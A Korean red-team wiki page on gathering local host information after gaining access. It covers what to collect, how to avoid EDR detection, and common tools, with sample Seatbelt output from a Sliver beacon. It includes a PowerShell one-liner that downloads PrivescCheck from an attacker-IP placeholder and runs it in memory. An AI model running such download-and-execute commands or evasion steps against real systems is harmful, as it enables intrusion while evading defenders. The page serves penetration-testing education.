---
description: MITRE ATTACK - TA0007 (T1082, T1016, ...)
---

# 로컬 호스트 정보 수집

초기 침투 이후 호스트에 접근 했다면 가장 먼저 해야할 일은 호스트/로컬 정보 수집이다. 이 호스트가 어떤 호스트인지, 생성된 프로세스가 어떤 유저의 컨텍스트(context)를 갖고 있는지, 어떤 AV/EDR 솔루션이 있는지 등을 파악하는 것이다. 이 단계를 잘 거쳐야만 레드팀으로서는 탐지 당하지 않고 안전하게 필요한 공격들을 수행할 수 있게 된다. 또한, 로컬 정보 수집으로 얻어진 정보들은 로컬 권한 상승 공격에 사용되기도 한다.&#x20;

이 페이지에서는 다음과 같은 정보들에 대해 알아본다.

1. 로컬 정보 수집을 실행할 때 알아봐야할 정보
2. 작전 보안을 위해 조심해야할 점
3. 로컬 정보 수집 툴&#x20;

정보 수집에 사용되는 명령어들은 [파워쉘 페이지](powershell.md)와 [C# 페이지](csharp.md)를 참고한다.&#x20;

### 로컬 정보 수집 - 정보

#### 기본 정보 &#x20;

* 호스트 이름&#x20;
* 도메인 이름
* 운영체제 이름 및 버전&#x20;
* 윈도우핫픽스, 보안 패치 리스트&#x20;
* Network Interface Cards (NICs) - Dual-Homed 체크&#x20;
* IP, subnet mask, gateway&#x20;
* ARP table&#x20;

#### 유저 정보&#x20;

* 유저 이름&#x20;
* 유저 권한
* 로컬 유저 그룹&#x20;

#### 프로세스 정보&#x20;

* 프로세스 리스트 확인&#x20;
* 현 프로세스의 32비트, 64비트 확인 (`IsWow64Process(), GetSystemInfo()`)

#### 보안 기술 확인&#x20;

* AV, EDR, Defender, AMSI, sysmon, logging frameworks&#x20;
* CredGuard&#x20;
* .NET Framework 버전 (4.8+ 이라면 .NET AMSI 확인)
* LAPS 적용 확인&#x20;
* 파워쉘 v2
* Applocker&#x20;



### 작전 보안&#x20;

타겟 호스트에 쉘을 얻자마자 `whoami, ipconfig` 등의 윈도우 기본 PE 바이너리(whoami는 명령어가 아니다)를 이용해 로컬 정보 수집을 한다면 그 즉시 EDR 솔루션에게 발각되어 프로세스가 종료될 것이다. 기본 명령어 및 기본 프로세스를 이용해 로컬 정보 수집을 하던 시대는 2000년대 이후로 끝났다.&#x20;

작전보안을 지키며 로컬 정보를 수집하고 싶다면 제3자 프로그래밍 언어 (로 만들어진 툴) 을 이용해 WinAPI혹은 direct 시스템 콜을 이용해 메모리상에서 윈도우 커널과 소통해야한다. 물론 이는 쉬운 일이 아니고, 실제 작전이 실행되고 있을 때 일일히 WinAPI 혹은 direct syscall을 코딩해 사용할 수는 없는 노릇이다.&#x20;

이 문제점을 해결하기 위해 레드팀들은 로컬 정보 수집을 위한 툴을 만들기 시작했다. &#x20;



### 실습과 툴&#x20;

2022년대 기준 로컬 정보 수집은 비컨 프로세스의 메모리상에서 winapi/direct syscall 툴을 실행하거나, 다른 프로세스에 인젝션을 통해 진행한다.&#x20;

유명한 로컬 정보 수집 툴들은 다음과 같다:&#x20;

* [Seatbelt](https://github.com/GhostPack/Seatbelt)&#x20;
* [Situational-Awareness BOF ](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
* [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
* [PrivescCheck](https://github.com/itm4n/PrivescCheck)

{% tabs %}
{% tab title="비컨 - 레드팀" %}
sliver 비컨에서 Seatbelt 라는 로컬 정보 수집 툴을 이용한다.&#x20;

```
sliver (LOST_QUICKSAND) > seatbelt '' "-group=system"

< ... > 

====== WindowsAutoLogon ======                                                                                        
                                                                                                                      
  DefaultDomainName              : CHOI                                                                               
  DefaultUserName                : Administrator                                                                      
  DefaultPassword                :                                                                                    
  AltDefaultDomainName           :                                                                                    
  AltDefaultUserName             :                                                                                    
  AltDefaultPassword             :                                                                                    
                                                           
====== WindowsDefender ======         
                                                           
Locally-defined Settings:                                  
                                                           
                                                           
                                                                                                                      
GPO-defined Settings:                                      
====== WindowsEventForwarding ======  
                                                           
====== WindowsFirewall ======                              
                                                           
Collecting Windows Firewall Non-standard Rules
                                                                                                                      
                                                                                                                      
Location                     : SOFTWARE\Policies\Microsoft\WindowsFirewall

< ... >
```
{% endtab %}

{% tab title="윈도우 - 모의해킹" %}
모의해킹 실행시 타겟에 횡적이동을 한 뒤 파워쉘을 이용해 로컬 정보 수집을 진행한다. 파워쉘 스크립트를 모의해커의 호스트에서 불러온 뒤, 메모리상에서 실행시킨다. 툴은 PrivEscCheck.ps1을 사용한다.&#x20;

```
# 공격자 호스트에서 불러온 뒤 실행 
iex(new-object net.webclient).downloadstring('http://<공격자IP>:<포트>/PrivescCheck.ps1');Invoke-PrivEscCheck

< ... >
+-----------------------------------------------------------------------------+
|                         ~~~ PrivescCheck Report ~~~                         |
+----+------+-----------------------------------------------------------------+
| NA | None | CONFIG > SCCM Cache Folder (info)                               |
| OK | None | CONFIG > Hardened UNC Paths                                     |
| OK | None | CONFIG > Point and Print                                        |
| OK | None | CONFIG > WSUS Configuration                                     |
| NA | None | CONFIG > Driver Co-Installers -> 1 result(s)                    |
| NA | None | CREDS > Vault List                                              |
| OK | None | CREDS > GPP Passwords                                           |
< ... > 
```
{% endtab %}
{% endtabs %}



